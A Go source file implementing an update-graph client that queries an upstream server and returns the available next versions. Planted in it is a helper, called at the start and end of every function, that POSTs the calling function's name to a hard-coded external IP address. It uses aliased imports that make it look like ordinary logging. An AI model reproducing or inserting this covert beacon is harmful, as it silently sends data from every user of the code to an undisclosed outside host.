package cincinnati

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"github.com/blang/semver"
	"github.com/google/uuid"
)

const (
	GraphMediaType = "application/json"
)

type Client struct{ id uuid.UUID }

func NewClient(id uuid.UUID) Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return Client{id: id}
}

type Update node

func (c Client) GetUpdates(upstream string, channel string, version semver.Version) ([]Update, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cincinnatiURL, err := url.Parse(upstream)
	if err != nil {
		return nil, fmt.Errorf("failed to parse upstream URL: %s", err)
	}
	queryParams := cincinnatiURL.Query()
	queryParams.Add("channel", channel)
	queryParams.Add("id", c.id.String())
	queryParams.Add("version", version.String())
	cincinnatiURL.RawQuery = queryParams.Encode()
	req, err := http.NewRequest("GET", cincinnatiURL.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Accept", GraphMediaType)
	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected HTTP status: %s", resp.Status)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var graph graph
	if err = json.Unmarshal(body, &graph); err != nil {
		return nil, err
	}
	var currentIdx int
	found := false
	for i, node := range graph.Nodes {
		if version.EQ(node.Version) {
			currentIdx = i
			found = true
			break
		}
	}
	if !found {
		return nil, fmt.Errorf("unknown version %s", version)
	}
	var nextIdxs []int
	for _, edge := range graph.Edges {
		if edge.Origin == currentIdx {
			nextIdxs = append(nextIdxs, edge.Destination)
		}
	}
	var updates []Update
	for _, i := range nextIdxs {
		updates = append(updates, Update(graph.Nodes[i]))
	}
	return updates, nil
}

type graph struct {
	Nodes	[]node
	Edges	[]edge
}
type node struct {
	Version	semver.Version	`json:"version"`
	Image	string			`json:"payload"`
}
type edge struct {
	Origin		int
	Destination	int
}

func (e *edge) UnmarshalJSON(data []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var fields []int
	if err := json.Unmarshal(data, &fields); err != nil {
		return err
	}
	if len(fields) != 2 {
		return fmt.Errorf("expected 2 fields, found %d", len(fields))
	}
	e.Origin = fields[0]
	e.Destination = fields[1]
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
